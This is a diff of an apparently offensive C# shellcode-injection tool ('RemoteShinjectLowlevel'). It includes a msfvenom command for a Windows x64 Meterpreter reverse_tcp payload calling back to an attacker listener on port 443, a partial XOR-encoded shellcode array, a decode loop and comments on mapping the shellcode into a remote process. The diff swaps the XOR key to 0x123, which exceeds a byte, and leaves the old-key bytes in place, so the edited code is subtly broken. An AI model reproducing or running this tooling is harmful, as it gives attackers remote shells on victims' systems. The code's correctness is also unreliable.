@@ -50,8 +50,8 @@ namespace RemoteShinjectLowlevel
                 return;
             }
 
-            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.232.133 LPORT=443 EXITFUNC=thread -f csharp
-            // XORed with key 0xfa
+            // msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 EXITFUNC=thread -f csharp --encrypt xor --encrypt-key '291'
+            // XORed with key 0x123
             byte[] buf = new byte[511] {
             0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, 0xfa, 0xfa, 0xbb, 0xab, 0xbb, 0xaa, 0xa8,
             0x05, 0x05, 0x05, 0xb2, 0xfb, 0x39, 0xb2, 0xd3, 0x3c, 0xb2, 0x7f, 0x0c, 0x8f, 0x4e, 0xbb,
@@ -97,7 +97,7 @@ namespace RemoteShinjectLowlevel
             // Decode shellcode
             for (int i = 0; i < buf.Length; i++)
             {
-                buf[i] = (byte)((uint)buf[i] ^ 0xfa);
+                buf[i] = (byte)((uint)buf[i] ^ 0x123);
             }
 
             // Copy shellcode to locally mapped view, which will be reflected in the remote mapping
